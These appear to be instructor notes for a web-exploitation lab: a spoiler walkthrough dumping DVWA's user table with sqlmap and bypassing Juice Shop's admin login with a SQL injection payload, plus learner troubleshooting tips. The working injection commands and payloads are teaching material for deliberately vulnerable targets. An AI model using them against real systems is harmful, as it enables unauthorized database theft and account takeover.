---
title: "Lab 7 Notes: Web Application Exploitation"
---

## CTF walkthrough (spoiler)

### Part 1: DVWA admin password hash

After logging in and setting security to Low:

```bash
curl -s -c /tmp/c.txt http://10.10.7.10/login.php -o /tmp/login.html
TOKEN=$(grep -oP "user_token' value='\K[^']+" /tmp/login.html)
curl -s -b /tmp/c.txt -c /tmp/c.txt --data-urlencode "user_token=$TOKEN" \
  -d "username=admin&password=password&Login=Login" http://10.10.7.10/login.php -o /dev/null
COOKIE=$(grep -oP 'PHPSESSID\s+\K\S+' /tmp/c.txt | tail -1)

sqlmap -u "http://10.10.7.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$COOKIE; security=low" --batch -D dvwa -T users --dump
```

sqlmap dumps the `users` table including `admin`'s MD5 hash —
`5f4dcc3b5aa765d61d8327deb882cf99`, which is the MD5 of `password` (the same
credential used to log in — DVWA doesn't hash its default seed data with a
salt).

### Part 2: Juice Shop admin login bypass

```bash
curl -s -X POST http://10.10.7.11:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}"
```

Returns a JWT. Decode the payload (middle `.`-separated section):

```bash
echo '<paste-the-middle-section-here>' | base64 -d
```

The decoded JSON shows `"email":"admin@juice-sh.op","role":"admin"` —
authenticated as the site admin.

### Lesson

Both bugs are the *same* underlying flaw — untrusted input concatenated into
a SQL query — expressed two different ways: a GET parameter on an old PHP
app, and a JSON field on a modern Node/Sequelize app. The fix (parameterized
queries / an ORM used correctly) is also the same in both cases.

## Common sticking points

- **Exercise 1.2 (curl without a `PHPSESSID`):** learners may get inconsistent
  results depending on whether DVWA redirects unauthenticated requests to
  the login page. If a learner reports the curl command "not working," check
  whether they're comparing it against a still-valid browser session cookie
  or truly testing with no `PHPSESSID` at all — the worksheet intends this
  as an open, hands-on test rather than a guaranteed-identical result for
  everyone.
- **Exercise 2.x (grabbing `PHPSESSID` via curl):** the `TOKEN` scrape
  (`grep -oP "user_token' value='\K[^']+"`) is brittle — it depends on
  DVWA's login form HTML not changing. If sqlmap gets 0 results or a login
  redirect, have the learner re-check `/tmp/login.html` and confirm `TOKEN`
  and `COOKIE` are non-empty before running sqlmap.
- **Exercise 3.2 (Juice Shop bypass):** the injected email must be exactly
  `' OR 1=1--` (including the trailing space is often needed after `--` in
  some SQL dialects, though Sequelize/SQLite here tolerates the payload as
  given). If a learner gets an auth failure, double check quoting — the
  outer JSON string requires escaping the inner double quotes as shown in
  the worksheet's curl command.
